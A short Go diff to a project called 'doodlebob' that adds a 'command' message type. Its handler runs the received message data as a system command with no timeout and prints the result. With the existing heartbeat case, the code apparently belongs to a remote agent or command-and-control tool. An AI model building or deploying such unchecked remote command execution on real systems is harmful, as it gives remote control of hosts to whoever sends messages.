@@ -6,6 +6,7 @@ import (
 	"fmt"
 
 	"github.com/MeHungr/doodlebob/internal/message"
+	"github.com/MeHungr/doodlebob/pkg/executor"
 )
 
 // handleMessage takes a message, dissects its fields, and sends the data to the proper function
@@ -16,6 +17,10 @@ func handleMessage(msg *message.Message) error {
 		switch msg.Type {
 		case "heartbeat":
 			fmt.Print("beat")
+		case "command":
+			out, returnCode := executor.ExecuteCommand(msg.Data, nil) // execute the command with no timeout
+			fmt.Print(out)
+			fmt.Print(returnCode)
 		}
 	default:
 		fmt.Println("Not correct destination host")
